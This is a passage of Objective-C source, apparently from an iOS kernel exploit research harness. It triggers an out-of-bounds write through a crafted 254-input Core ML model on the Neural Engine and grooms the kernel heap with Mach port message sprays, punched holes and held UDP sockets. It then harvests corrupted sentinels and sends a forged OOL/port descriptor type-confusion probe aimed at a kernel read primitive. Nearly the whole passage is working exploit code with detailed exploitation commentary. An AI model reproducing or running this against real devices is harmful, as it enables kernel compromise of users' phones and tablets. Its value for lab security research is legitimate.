    MLModel *model254 = [MLModel modelWithContentsOfURL:url254 configuration:cfg error:&err];
    if (!model254) {
        p073_log(@"[-] addchain load FAILED: %@", err.localizedDescription ?: @"-");
    }
    MLModelConfiguration *cfgSmall = [[MLModelConfiguration alloc] init];
    cfgSmall.computeUnits = MLComputeUnitsCPUAndNeuralEngine;
    NSError *errS = nil;
    MLModel *modelSmall = [MLModel modelWithContentsOfURL:urlSmall configuration:cfgSmall error:&errS];
    if (!modelSmall) {
        p073_log(@"[-] small load FAILED: %@", errS.localizedDescription ?: @"-");
    }
    if (!model254 || !modelSmall) {
        p073_log(@"=== VERDICT === abort (model load). hasKread=NO.");
        for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
        NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
    }
    p073_log(@"[+] models loaded: addchain (All) + simple_1in1out (CPU+NE)");

    /* ---- features: in-bounds i+1; OOB (>=192) armed with OUR surface ids ---- */
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < P073_INPUTS; i++) {
        MLMultiArray *arr = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                       dataType:MLMultiArrayDataTypeDouble
                                                          error:nil];
        if (!arr) break;
        double val;
        if (i >= P073_OOB_FIRST && nSurf > 0) {
            val = (double)surfs[(i - P073_OOB_FIRST) % nSurf].sid;
        } else {
            val = (double)(i + 1);
        }
        arr[0] = @(val);
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:arr];
    }
    MLDictionaryFeatureProvider *provider =
        [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:&err];
    if (!provider) {
        p073_log(@"[-] feature provider FAILED: %@", err.localizedDescription ?: @"-");
        p073_log(@"=== VERDICT === abort (features). hasKread=NO.");
        for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
        NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
    }
    p073_log(@"[+] features armed: x_000..x_191 = i+1; x_192..x_253 = our IOSurface ids (D1 consume test)");

    MLMultiArray *smallArr = [[MLMultiArray alloc] initWithShape:@[ @1, @1 ]
                                                        dataType:MLMultiArrayDataTypeFloat32
                                                           error:nil];
    if (smallArr) smallArr[0] = @(3.0);
    MLDictionaryFeatureProvider *smallFP = nil;
    if (smallArr) {
        MLFeatureValue *fv = [MLFeatureValue featureValueWithMultiArray:smallArr];
        if (fv) {
            smallFP = [[MLDictionaryFeatureProvider alloc]
                initWithDictionary:@{ @"input": fv } error:nil];
        }
    }
    if (!smallFP) p073_log(@"[!] small feature provider FAILED — fire will abort");

    /* ---- spray: 64 sentinels, 128 holes, 64 sentinels (all 0x820 kdata) ---- */
    p073_held_t *sentPre  = calloc(P073_N_SENT, sizeof(p073_held_t));
    p073_held_t *holes    = calloc(P073_N_HOLES, sizeof(p073_held_t));
    p073_held_t *sentPost = calloc(P073_N_SENT, sizeof(p073_held_t));
    /* v9 (264 Route-A): the prefill pair IS the positioned groom — record 192
       lands at the free neighbor's offset 0, so LIVE portkind kmsgs placed
       immediately before the fire (0 ms interleave, CPU-pinned) are the
       crossing. Hoisted to tap scope; v8 leaked them unharvested. */
    p073_held_t *fill     = calloc(2, sizeof(p073_held_t));
    uint32_t nPre = 0, nHoles = 0, nPost = 0, nFill = 0;

    for (uint32_t i = 0; i < P073_N_SENT; i++) {
        mach_port_t p = p073_make_port();
        if (p == MACH_PORT_NULL) break;
        sentPre[nPre].port = p; sentPre[nPre].index = 0x1000u | i; sentPre[nPre].alive = YES;
        /* v7f: sentPre is PORTKIND too — the 21:44 23F77 run landed the OOB
           record stream inside sentPre[4156]=0x103C (a simple sentinel, no
           desc region: "desc words unmodified"). Every neighbor must carry
           the port-desc {type@8,disp@10} words. Fallback keeps the band. */
        if (!p073_send_portkind(p, sentPre[nPre].index)) {
            if (!p073_send_simple(p, sentPre[nPre].index)) break;
        }
        nPre++;
    }
    /* v7h victim-class dial: Documents/p073_victim.txt = "inpcb" switches
       the HOLE band to LIVE UDP sockets (rw_inpcb neighbors — LightSword/
       SocketKRW adoption door: a smashed inpcb is adopted directly, no
       desc/phase alignment needed; 3072-class adjacency measured per boot).
       Default absent = port-kind (v8 law). The sockets stay OPEN for the
       whole tap (inpcb live = write-lane neighbor, like the kmsg law). */
    BOOL v7hInpcb = NO;
    {
        NSURL *v7hDocs = [[[NSFileManager defaultManager]
            URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] firstObject];
        NSString *vic = v7hDocs ? [NSString stringWithContentsOfURL:
            [v7hDocs URLByAppendingPathComponent:@"p073_victim.txt"]
            encoding:NSUTF8StringEncoding error:nil] : nil;
        v7hInpcb = [vic.lowercaseString containsString:@"inpcb"];
    }
    g_p073_inpcbN = 0;
    if (v7hInpcb) {
        p073_log(@"[v7h] INPCB BAND — 256 held UDP sockets as victim class");
        for (uint32_t i = 0; i < P073_N_HOLES; i++) {
            int sfd = socket(AF_INET, SOCK_DGRAM, 0);
            if (sfd < 0) break;
            struct sockaddr_in sa; memset(&sa, 0, sizeof sa);
            sa.sin_family = AF_INET; sa.sin_len = sizeof sa;
            sa.sin_port = htons((uint16_t)(30000u + (i & 0xfffu)));
            if (bind(sfd, (struct sockaddr *)&sa, sizeof sa) != 0) { close(sfd); break; }
            g_p073_inpcbFds[g_p073_inpcbN++] = sfd;   /* held open — inpcb LIVE */
        }
        p073_log(@"[v7h] inpcb band %u/%u sockets held LIVE (fd leaks intentional)",
                 g_p073_inpcbN, P073_N_HOLES);
        nHoles = g_p073_inpcbN;   /* v7h fix: feed the fire gate; holes[] ports
                                     stay NULL so recv scans skip them —
                                     the victims are the inpcbs, not kmsgs */
    }
    /* v8: holes are PORTKIND descriptor kmsgs - the fill's record OOB lands
       NEXT to (or over) a PORT DESCRIPTOR by construction; forged type@8 +
       disp@10 = the p073-v7 kread door. Simple fallback keeps the band alive
       if port-kind is rejected. */
    for (uint32_t i = (v7hInpcb ? P073_N_HOLES : 0); i < P073_N_HOLES; i++) {
        mach_port_t p = p073_make_port();
        if (p == MACH_PORT_NULL) break;
        holes[nHoles].port = p; holes[nHoles].index = 0x2000u | i; holes[nHoles].alive = YES;
        if (!p073_send_portkind(p, holes[nHoles].index)) {
            if (!p073_send_simple(p, holes[nHoles].index)) break;
        }
        nHoles++;
    }
    for (uint32_t i = 0; i < P073_N_SENT; i++) {
        mach_port_t p = p073_make_port();
        if (p == MACH_PORT_NULL) {
            p073_log(@"  [v7b] sentPost[i=%u] make_port NULL — band aborted at %u", i, nPost);
            break;
        }
        sentPost[nPost].port = p; sentPost[nPost].index = 0x3000u | i; sentPost[nPost].alive = YES;
        /* v7b: port-kind first; on rejection fall back to the proven simple
           shape so the band survives the round (mr logged at the sender). */
        if (!p073_send_portkind(p, sentPost[nPost].index)) {
            p073_log(@"  [v7b] falling back to simple for sentPost[%u]", sentPost[nPost].index);
            if (!p073_send_simple(p, sentPost[nPost].index)) break;
        }
        nPost++;
    }
    p073_log(@"[+] spray: sentPre=%u holes=%u sentPost=%u PORTKIND (kdata=0x820 each, v7 desc door)",
             nPre, nHoles, nPost);

    if (nHoles >= 2 && smallFP) {

    /* v5 SKU gate (2026-10-20 21:18 twin lesson): 254-in CheckandPrewire is
       fill_cap-dead on 23G71 (EXPECT-BAD 0xe00002c2) — the 43748 OOB cannot
       occur on this SKU at all. Printing MISS-ADJACENCY there is a lie; the
       honest output is SKIP. Documents/p073_force_fire.txt overrides
       (forensics only, panic possible). */
    if ([LabDeviceProfile detectedSku] == LabSkuA12X_23G71
        && ![[NSFileManager defaultManager] fileExistsAtPath:
            [docs stringByAppendingPathComponent:@"p073_force_fire.txt"]]) {
        p073_log(@"[SKIP] 254 CheckandPrewire is fill_cap-dead on 23G71 (EXPECT-BAD).");
        p073_log(@"[SKIP] The 43748 OOB cannot occur on this SKU — hunt lane is 23F77-only.");
        p073_log(@"[SKIP] Force with Documents/p073_force_fire.txt (forensics only).");
        p073_log(@"[VERDICT] kind=skip first_fail_stage=none fires=0 ok=0");
        p073_log(@"hasKread=NO.");
        if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
        NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
    }

    /* ---- punch ALL holes in allocation order (LIFO: hole[127] on top) ---- */
    {
        uint32_t punched = 0;
        for (uint32_t i = 0; i < nHoles; i++) {
            uint8_t rbuf[P073_MSG_SIZE + 64];
            memset(rbuf, 0, sizeof(rbuf));
            mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
            mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                            (mach_msg_size_t)sizeof(rbuf),
                                            holes[i].port, 0, MACH_PORT_NULL);
            if (mr == MACH_MSG_SUCCESS || mr == MACH_RCV_TOO_LARGE) {
                holes[i].alive = NO;
                punched++;
            }
        }
        p073_log(@"[+] punched %u/%u holes — magazine LIFO armed for two tables", punched, nHoles);
    }

    /* ---- v7j PREFILL-2: two LIVE port-kind kmsgs allocated immediately
       before the fire. Root cause (6 panic packs 21:55-22:56, v7i-proven):
       the 254 record-area pops the 3072 chunk whose ADDRESS-neighbor is the
       freelist chunk freed by the tap's own earlier small-predict teardown
       -> freed-lane MAF every boot (off:0, {sid,0xc0} at victim+0). Live-lane
       boots recv-measured mutated=64 landings instead. The prefill fills the
       immediate address-neighborhood with LIVE port-kind chunks so the
       record stream (landing L per boot: off:0/+0x10/+0x64 measured) lands
       on LIVE kmsg bodies; the phase law collects from the existing
       record[0] dumps. p088-v18 mapped-neighbor prefill law, ported. */
    if (fill) {
        for (uint32_t i = 0; i < 2; i++) {
            mach_port_t p = p073_make_port();
            if (p == MACH_PORT_NULL) break;
            fill[nFill].port = p;
            fill[nFill].index = 0x4000u | i;
            fill[nFill].alive = YES;
            p073_pin_cpu_b();    /* 262/264: punch on the fire's CPU (magazine split law) */
            if (!p073_send_portkind(p, fill[nFill].index) &&
                !p073_send_simple(p, fill[nFill].index))
                break;
            nFill++;
            p073_log(@"[v9] positioned prefill[%u]: LIVE portkind placed fire-1 hop (0x4000 band)", i);
        }
        p073_log(@"[v9] positioned groom: %u live prefill neighbor(s) immediately before the fire "
                 @"— record-192 crossing law (landing at off:0, no which-slot randomness)", nFill);
    }
    /* ---- FIRE: small table first (in-flight), then 254 addchain ---- */
    int pred254Attempts = 0;             /* v3 retry bookkeeping (verdict reads this) */
    BOOL pred254Fired = NO;
    p073_log(@">>> FIRE: small 1-in/1-out in-flight (table_small pops LIFO top),");
    p073_log(@">>>       254 addchain after %uus headstart (table_254 pops next).", P073_HEADSTART_US);
    p073_log(@">>>       If adjacent: table_254+0xc00 == table_small. PANIC POSSIBLE.");

    {
        /* v4: a single small table dies in ~1 ms, so the 254's forward
           neighbor was empty at fill time (19:29 MISS-ADJACENCY). Fire a
           BURST of smalls DURING the 254's marshal window instead: each
           small pops the next hole and stays table-alive for its ~1ms, and
           a bounded burst keeps fresh tables landing in the after-direction
           throughout the window. Every small's outcome names its table:
           a FAIL/HANG output = that table consumed smashed records = the
           consume signal (occupancy → conversion evidence by direction). */
        dispatch_semaphore_t smallDone = dispatch_semaphore_create(0);
        __block CFAbsoluteTime tSmall0 = 0, tSmall1 = 0;
        __block NSString *smallResult = @"no-run";
        CFAbsoluteTime tKick = CFAbsoluteTimeGetCurrent();
        __block unsigned smallGood = 0, smallBad = 0;
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            p073_pin_cpu_b();
            /* single small (kept: the original v2/v3 census table) */
            tSmall0 = CFAbsoluteTimeGetCurrent();
            NSError *pErr = nil;
            id<MLFeatureProvider> pred = [modelSmall predictionFromFeatures:smallFP error:&pErr];
            tSmall1 = CFAbsoluteTimeGetCurrent();
            if (pred) {
                MLFeatureValue *outv = [pred featureValueForName:@"output"];
                MLMultiArray *outa = outv.multiArrayValue;
                double got = outa ? outa[0].doubleValue : NAN;
                smallResult = [NSString stringWithFormat:@"ok output=%.6f (clean=~6.0)", got];
            } else {
                smallResult = [NSString stringWithFormat:@"FAIL %@/%ld",
                               pErr.domain ?: @"-", (long)pErr.code];
            }
            dispatch_semaphore_signal(smallDone);
        });
        /* v4 burst worker → v6 FRESH-INSTANCE burst (note 220/221): a repeat
           predict on the SAME model instance is a resource-CACHE HIT in
           CheckandPrewire (local_88 != 0 — the "Resource is already cached"
           path) and allocates NO record-area, so v4's burst iterations
           #2..#16 could not keep a fresh table_small in the 254's marshal
           window; only predict #1 ever had a table, and it dies ~1ms into
           its own prewire (thunk release, same call). Load a FRESH MLModel
           instance per iteration instead: new program stream => every
           resource is a lookup MISS => a fresh record-area allocates and
           pops the next LIFO hole INSIDE the window, alive for its ~1ms
           prewire. Neighbor geometry: holes allocated ascending, freed i=0..
           127, popped LIFO 127->...; a fresh small's table lands on the hole
           the 254's fill walks into (+0xc00 = +0x3e0 into the neighbor). */
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            p073_pin_cpu_b();
            NSMutableArray *holders = [NSMutableArray array];
            g_p073_burstHoldersRef = holders;  /* v7i: alive past harvest */
            __block unsigned smallLoads = 0;
            for (uint32_t k = 0; k < P073_SMALL_BURST; k++) {
                MLModelConfiguration *cfgB = [[MLModelConfiguration alloc] init];
                cfgB.computeUnits = MLComputeUnitsCPUAndNeuralEngine;
                NSError *lErr = nil;
                CFAbsoluteTime tl0 = CFAbsoluteTimeGetCurrent();
                MLModel *fresh = [MLModel modelWithContentsOfURL:urlSmall configuration:cfgB error:&lErr];
                if (!fresh) {
                    dispatch_async(dispatch_get_main_queue(), ^{
                        p073_log(@"[B6] small load #%u FAILED %@/%ld (no fresh table this iter)",
                                 k, lErr.domain ?: @"-", (long)lErr.code);
                    });
                    usleep(P073_SMALL_BURST_GAP_US);
                    continue;
                }
                [holders addObject:fresh];
                smallLoads++;
                NSError *bErr = nil;
                id<MLFeatureProvider> bPred = [fresh predictionFromFeatures:smallFP error:&bErr];
                if (bPred) {
                    smallGood++;
                } else {
                    smallBad++;
                    dispatch_async(dispatch_get_main_queue(), ^{
                        p073_log(@"[B6] small #%u FAILED %@/%ld — table consumed smashed records",
                                 k, bErr.domain ?: @"-", (long)bErr.code);
                    });
                }
                usleep(P073_SMALL_BURST_GAP_US);
            }
            /* hold the fresh program streams alive through the whole window:
               the burst loop itself spans >= 16 load+predict+gap iterations,
               which covers the 254's >=10ms-marshal retry window (~100-700ms),
               so freeing the stream holders here is already post-window */
            [holders removeAllObjects];
            p073_log(@"[B6] burst fresh tables: loads=%u good=%u bad=%u", smallLoads, smallGood, smallBad);
        });
        usleep(P073_HEADSTART_US);

        /* v3: fast -1 reject (8ms in v2) is the NO-FILL signature — v42 proved
           POST-marshal rejects still fill, and an 8ms rejection almost
           certainly means the request never marshaled (pre-marshal reject /
           dirty ANE). Bounded re-arm up to P073_254_RETRY, 200ms apart. */
        id<MLFeatureProvider> pred254 = nil;
        NSError *err254 = nil;
        CFAbsoluteTime t254_0 = CFAbsoluteTimeGetCurrent();
        for (uint32_t attempt = 1; attempt <= P073_254_RETRY; attempt++) {
            err254 = nil;
            t254_0 = CFAbsoluteTimeGetCurrent();
            pred254 = [model254 predictionFromFeatures:provider error:&err254];
            CFAbsoluteTime t254_1 = CFAbsoluteTimeGetCurrent();
            double ms = (t254_1 - t254_0) * 1000.0;
            pred254Attempts = attempt;
            p073_log(@"[*] 254 predict try %u/%u %@ t=%.0fms (kick->ret)",
                     attempt, P073_254_RETRY, pred254 ? @"returned" : @"FAILED", ms);
            if (pred254) {
                pred254Fired = YES;
                break;
            }
            if (ms >= 10.0) {
                /* v5 threshold (2026-10-20 21:19 correction): the 19:41 MAF
                   pair proved a 13ms-reject boot FIRED the fill — the old
                   15ms line was wrong. Treat >=10ms as marshal-window open;
                   the true no-fill signature is only the very fast rejects
                   (<10ms, the 00:15 8ms class). */
                pred254Fired = YES;
                p073_log(@"[FIRE] 254 marshal window open (%.0fms reject = post-marshal) — stop re-arming", ms);
                break;
            }
            if (attempt < P073_254_RETRY) usleep(200000);
        }
        if (pred254) {
            MLFeatureValue *y = [pred254 featureValueForName:@"y"];
            MLMultiArray *ya = y.multiArrayValue;
            p073_log(@"[*] 254 y[0]=%@ (addchain: prediction OK is UNEXPECTED — check model)",
                     ya ? ya[0] : @"<no y>");
        } else {
            p073_log(@"[*] 254 error: %@ %ld after %d tries — %@",
                     err254.domain ?: @"-", (long)err254.code, pred254Attempts,
                     pred254Fired
                       ? @"fill LIKELY FIRED (post-marshal reject, v42 class)"
                       : @"fill DID NOT FIRE (pre-marshal rejects — dirty ANE or model state)");
        }

        long waitRes = dispatch_semaphore_wait(smallDone, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
        if (waitRes != 0) {
            p073_log(@"[*] small predict: STILL IN-FLIGHT after 10s wait (hang = consume anomaly?)");
        } else {
            p073_log(@"[*] small predict: %@ (start t+%.0fms, dur %.0fms)",
                     smallResult,
                     (tSmall0 - tKick) * 1000.0, (tSmall1 - tSmall0) * 1000.0);
        }
        if (P073_SMALL_BURST)
            p073_log(@"[B4] burst tally: good=%u bad=%u (bad = that small's table "
                     @"consumed smashed records — direction+consume named; v6 "
                     @"fresh-instance loads keep tables alive in-window)", smallGood, smallBad);
        p073_log(@"[*] small ANOMALY check: error/hang/wrong-output => table_small consumed smashed records");
    }

    /* ---- D1 scan: did the ANE touch our surfaces? ---- */
    uint32_t touched = p073_surface_scan(surfs, nSurf);
    p073_log(@"[D1] surface scan: %u touched of %u", touched, nSurf);

    /* ---- D2 harvest: sentPre payload sentinels + positioned prefill + sentPost PORT-KIND door ---- */
    g_p073_oolHits = 0;
    uint32_t mut = 0, clean = 0, descForged = 0;
    for (uint32_t i = 0; i < nPre; i++) {
        if (!sentPre[i].alive) continue;
        int r = p073_harvest_one(&sentPre[i], "sentPre");
        if (r < 0) mut++; else if (r > 0) clean++;
    }
    /* v9: the positioned groom pair — decoded FIRST (they are the record-192
       crossing candidates; 264 law says the landing starts at their off:0) */
    for (uint32_t i = 0; i < nFill; i++) {
        if (!fill[i].alive) continue;
        uint32_t forged = 0;
        int r = p073_harvest_portkind(&fill[i], &forged);
        if (r < 0) { mut++; descForged += forged; } else if (r > 0) clean++;
    }
    for (uint32_t i = 0; i < nPost; i++) {
        if (!sentPost[i].alive) continue;
        uint32_t forged = 0;
        int r = p073_harvest_portkind(&sentPost[i], &forged);
        if (r < 0) { mut++; descForged += forged; } else if (r > 0) clean++;
    }
    p073_log(@"[D2] sentinel harvest: mutated=%u clean=%u descForged=%u", mut, clean, descForged);

        /* v7j1 CHAIN HOOK: when the harvest proves a forged descriptor or any
           smashed port-kind sentinel, the smashed port RIGHT is adoptable
           directly (recv already holds it). Record the ready-state on the
           board so the socket-adopt/kread provider build consumes it. */
        if (mut > 0 || descForged > 0) {
            NSMutableArray *rights = [NSMutableArray array];
            for (uint32_t i = 0; i < nPre; i++)
                if (sentPre[i].alive && sentPre[i].port != MACH_PORT_NULL)
                    [rights addObject:@(sentPre[i].port)];
            id bd = [[NSClassFromString(@"P007Board") alloc] init];
            NSString *det = [NSString stringWithFormat:
                @"mutated=%u descForged=%u livePortRights=%lu (next: OOL-forged kread door v9)",
                mut, descForged, (unsigned long)rights.count];
            if (bd && [bd respondsToSelector:@selector(recordEvent:kind:detail:source:)]) {
                ((void (*)(id, SEL, id, id, id, id))objc_msgSend)(
                    bd, @selector(recordEvent:kind:detail:source:),
                    @"p073_chain_ready", @"adopt", det, @"p073");
                p073_log(@"[CHAIN] p073_chain_ready board event — %@", det);
            }
        }

    /* ---- v9 pre-stage: the OOL/port swap probe (the CHAIN line's named act) ----
       Self-contained, NO reader needed: one new msg whose single descriptor
       carries a REAL live right's name but the forged wire-type of an OOL
       descriptor (the wire shape is identical 12B — that IS the confusion).
       Send-side verdict + one recv; honest early-outs. Sealed classes
       respected: no fat type-3 OOL recv (PACGA-fatal, v45), no fabricated
       names (they fail copyin — p113-v1 law). A REAL kernel-bytes copyout
       needs a kernel address in the desc's address word = the
       post-certificate rung (after kbase/typeinfo). */
    {
        p073_log(@"[*] v9 pre-stage: OOL/port swap probe (one forged send, one recv)");
        mach_port_t probePort = p073_make_port();
        if (!probePort) {
            p073_log(@"[-] v9 probe port alloc fail");
        } else {
            mach_port_t liveSend = MACH_PORT_NULL;
            for (uint32_t i2 = 0; i2 < nPre; i2++)
                if (sentPre[i2].alive && sentPre[i2].port != MACH_PORT_NULL) { liveSend = sentPre[i2].port; break; }
            if (!liveSend) {
                p073_log(@"[-] v9: no live right available for the probe");
            } else {
                uint8_t sbuf[0x80]; memset(sbuf, 0, sizeof sbuf);
                mach_msg_header_t *h2 = (mach_msg_header_t *)sbuf;
                mach_msg_body_t *b2 = (mach_msg_body_t *)(sbuf + sizeof(mach_msg_header_t));
                b2->msgh_descriptor_count = 1;
                mach_msg_port_descriptor_t *d2 = (mach_msg_port_descriptor_t *)(sbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
                d2->name = liveSend;
                d2->disposition = MACH_MSG_TYPE_COPY_SEND;
                d2->type = 1;   /* MACH_MSG_OOL_DESCRIPTOR — the forged word */
                h2->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                /* v8b (00:06 12 lesson): the kernel minimum for a 1-desc complex
                   msg = hdr+body+16 (the arm64 wire desc stride) — my 12 sizing
                   sent MACH_SEND_TOO_SMALL (268435464 = 0x8) and MY banner
                   mislabeled it "confused". Honest send = 16B stride. */
                h2->msgh_size = (mach_msg_size_t)(sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + 16);
                h2->msgh_remote_port = probePort;
                kern_return_t kr2 = mach_msg(h2, MACH_SEND_MSG, h2->msgh_size, 0,
                                             MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
                p073_log(@"[*] forged-type send kr=%u (%s)%s",
                         kr2, mach_error_string(kr2),
                         kr2 == 0 ? " — ACCEPTED: translator confused (the swap's first fire)"
                                  : " — rejected pre-translation (honest)");
                uint8_t rbuf2[0x100]; memset(rbuf2, 0, sizeof rbuf2);
                mach_msg_header_t *rh2 = (mach_msg_header_t *)rbuf2;
                kr2 = mach_msg(rh2, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof rbuf2, probePort, 1000, MACH_PORT_NULL);
                p073_log(@"[*] recv kr=%u size=%u", kr2, rh2->msgh_size);
                if (kr2 == KERN_SUCCESS) {
                    mach_msg_body_t *rb2 = (mach_msg_body_t *)(rbuf2 + sizeof(mach_msg_header_t));
                    p073_log(@"[v9] RECV OK desc_count=%u — translation bar reached "
                             @"(desc-class verdict = the harvest's portkind path)",
                             rb2->msgh_descriptor_count);
                }
            }
        }
    }
    /* ---- verdict ---- */
    BOOL conv = (touched > 0 || descForged > 0 || g_p073_oolHits > 0);
    p073_log(@"=== VERDICT ===");
    if (g_p073_oolHits > 0)
        p073_log(@"[v9] OOL DOOR: %u forged-OOL descriptor(s) yielded receiver-side readable "
                 @"bytes — the dumps above are the evidence; kernel-range qwords = the "
                 @"body_forged AND kptr bar evaluated YES (the kread door).", g_p073_oolHits);
    if (touched > 0) {
        p073_log(@"conversion SIGNAL: ANE touched our IOSurface(s) — table_small consume of forged records.");
        p073_log(@"Next: identify WHICH sid landed (record dump), then passthrough model for exact control.");
        [[P007Board shared] recordEvent:@"p073_session" kind:@"conversion"
                                 detail:@"surface touched — consume signal" source:@"p073"];
    } else if (descForged > 0) {
        /* v7: record bytes landed in a PORT-KIND victim's descriptor region and
           the kernel PROCESSED the forged descriptors — this is the desc_type_forged
           bar half, evaluated on the chunk the fill demonstrably hits every boot. */
        p073_log(@"desc DOOR HIT: %u forged descriptor word(s) processed by the kernel recv path",
                 descForged);
        p073_log(@"on the v7 port-kind band. Bar desc_type_forged evaluated — confirm the type");
        p073_log(@"word class above (OOL-type/ptr) and identify WHAT the forged desc became.");
        [[P007Board shared] recordEvent:@"p073_session" kind:@"conversion"
                                 detail:[NSString stringWithFormat:@"descForged=%u — bar half one", descForged]
                                 source:@"p073"];
    } else if (mut > 0) {
        p073_log(@"occupancy HIT only (fill landed, desc words unmodified). Adjacency still the door.");
        p073_log(@"conversion=NO. Bar: desc_type_forged OR (body_forged AND kptr).");
        [[P007Board shared] recordEvent:@"p073_session" kind:@"occupancy"
                                 detail:@"fill hit, desc region intact" source:@"p073"];
    } else {
        /* v3: disambiguate MISS — no-fill is NOT an adjacency result. */
        if (!pred254Fired) {
            p073_log(@"MISS (NO-FILL): 254 never marshaled (all %d rejects fast).",
                     pred254Attempts);
            p073_log(@"NOT an adjacency result. Reboot (note209 dirty-boot rule) and retap on");
            p073_log(@"a fresh boot with this tap FIRST, before p099 — ANE state was dirty.");
            [[P007Board shared] recordEvent:@"p073_session" kind:@"miss"
                                     detail:@"no-fill (pre-marshal rejects)" source:@"p073"];
        } else {
            p073_log(@"MISS (ADJACENCY): fill marshaled — no surface touch, no sentinel hit, so");
            p073_log(@"the neighbor was unknown or empty. Check for a later IPS panic anyway");
            p073_log(@"(CheckandPrewire+0x18c GZAlloc page-end, or [data.kalloc.3072] MAF).");
            p073_log(@"v4 burst note: if any [B4] small FAILED above, at least one small");
            p073_log(@"table DID consume smashed records — re-read the tally before retapping.");
            [[P007Board shared] recordEvent:@"p073_session" kind:@"miss"
                                     detail:@"adjacency-miss (fill fired)" source:@"p073"];
        }
    }
    p073_log(@"[VERDICT] kind=%s first_fail_stage=%s fires=%d ok=%d",
             conv ? "conversion"
               : (mut > 0 ? "occupancy" : "miss"),
             conv ? "none"
               : (mut > 0 ? "adjacency" : (!pred254Fired ? "a-fill" : "b-adjacency")),
             (int)pred254Attempts, conv ? 1 : 0);
    p073_log(@"hasKread=NO. kread32 registers only from a copyout of kernel bytes we did not write.");
    p073_log(@"One TAP per force-quit. Reboot if ANE/kmsg state is dirty.");

    } else {
        p073_log(@"[-] hole spray too small — abort before fire");
        p073_log(@"=== VERDICT === abort (spray). hasKread=NO.");
    }

    for (uint32_t i = 0; i < nPre; i++)
        if (sentPre[i].port != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), sentPre[i].port);
    for (uint32_t i = 0; i < nFill; i++)
        if (fill[i].port != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), fill[i].port);
    free(fill);
    for (uint32_t i = 0; i < nHoles; i++)
        if (holes[i].port != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), holes[i].port);
    for (uint32_t i = 0; i < nPost; i++)
        if (sentPost[i].port != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), sentPost[i].port);
    free(sentPre); free(holes); free(sentPost);
    for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);

    if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
    NSString *ret = g_p073_buf;
    g_p073_buf = nil;
    return ret;
}

@end
